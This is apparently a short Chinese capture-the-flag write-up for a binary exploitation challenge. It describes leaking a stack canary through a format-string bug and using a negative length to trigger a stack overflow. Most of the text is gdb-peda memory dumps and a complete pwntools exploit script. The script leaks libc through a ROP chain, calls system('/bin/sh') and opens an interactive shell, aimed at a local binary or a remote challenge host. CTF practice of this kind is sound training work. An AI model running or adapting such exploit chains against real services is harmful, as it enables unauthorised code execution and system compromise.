一个格式化字符串，一个栈溢出。
格式化字符串泄露cannay

栈溢出那里直接给一个负数rop

-9223372036854775808

```
gdb-peda$ x /20gx $rsp
0x7fffffffdd30:	0x00000000004009e0	0x0000000000614c20
0x7fffffffdd40:	0x3131313131313131	0x0000000000000000
0x7fffffffdd50:	0x0000000000000000	0x00007ffff74ed439
0x7fffffffdd60:	0x00007ffff783a620	0x00007ffff74e4dbd
0x7fffffffdd70:	0x0000000000000000	0x4bf4d576e473ad00
0x7fffffffdd80:	0x00007fffffffddc0	0x0000000000400ec9
0x7fffffffdd90:	0x0000000000000000	0x0000000000000000
0x7fffffffdda0:	0x0000000000400f40	0x0000000000400aa0
0x7fffffffddb0:	0x00007fffffffdea0	0x0000000000000000
0x7fffffffddc0:	0x0000000000400f40	0x00007ffff7495830
gdb-peda$ fmtarg 0x7fffffffdd78
The index of format argument : 15
```

```
gdb-peda$ x /10gx $rsp
0x7fffffffdd30:	0x00000000004009e0	0x0000000000614c20
0x7fffffffdd40:	0x3131313131313131	0x0000000000000000
0x7fffffffdd50:	0x0000000000000000	0x00007ffff74ed439
0x7fffffffdd60:	0x00007ffff783a620	0x00007ffff74e4dbd
0x7fffffffdd70:	0x0000000000000000	0x4b79367d49f7c800
gdb-peda$ x /10gs 0xV
Invalid number "0xV".
gdb-peda$ x /10gs 0x614c20
warning: Unable to display strings with size 'g', using 'b' instead.
0x614c20:	"11111111"
0x614c29:	""
0x614c2a:	""
0x614c2b:	""
0x614c2c:	""
0x614c2d:	""
0x614c2e:	""
0x614c2f:	""
0x614c30:	""
0x614c31:	""
gdb-peda$ fmtarg 0x7fffffffdd38
The index of format argument : 7
```

payload
```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *
import time
import sys

context(arch = "amd64",os= "linux" )
context.log_level = 'DEBUG'
context.terminal = ['terminator', '-e']
target = "./exploit_1"

def pwn_it(status):
    if status==1:
        pwn=process(target,env={"LD_PRELOAD":"./libc.so.6"})
    else:
        pwn = remote("118.25.216.151",10001)

    def debug():
        gdb.attach(pwn,'''
        b * 0x400B96
        c
        ''')
    
    elf = ELF(target)

    pwn.recvuntil("name:")
    pwn.sendline("/bin/sh;%7$llxqqq%15$llx")
    pwn.recvuntil("/bin/sh;")
    p_sh = int(pwn.recvuntil("qqq")[:-3],16)
    print "p_sh="+hex(p_sh)
    cannry = int(pwn.recvuntil("please")[:-6],16)
    print "cannry="+hex(cannry)
    pwn.sendlineafter("motto:","-9223372036854775808")


    got_puts = elf.got['puts']
    plt_puts = elf.plt['puts']
    #0x0000000000400fa3 : pop rdi ; ret
    pop_rdi_addr = 0x400fa3
    payload = (0x410-8)*'\x00'+p64(cannry)+p64(0)+p64(pop_rdi_addr)+p64(got_puts)+p64(plt_puts)+p64(0x400DA0)
    pwn.sendlineafter("motto:",payload)
    puts_addr = u64(pwn.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    libc = ELF("./libc.so.6")
    libc_base = puts_addr-libc.sym['puts']
    system_addr =libc_base+libc.sym['system'] 
    print "puts_addr="+hex(puts_addr)
    print "system_addr="+hex(system_addr)

    pwn.sendlineafter("motto:","-9223372036854775808")
    payload = (0x410-8)*'\x00'+p64(cannry)+p64(0)+p64(pop_rdi_addr)+p64(p_sh)+p64(system_addr)
    pwn.sendlineafter("motto:",payload)
    pwn.interactive()


if __name__ == "__main__":
    pwn_it(int(sys.argv[1]))

```
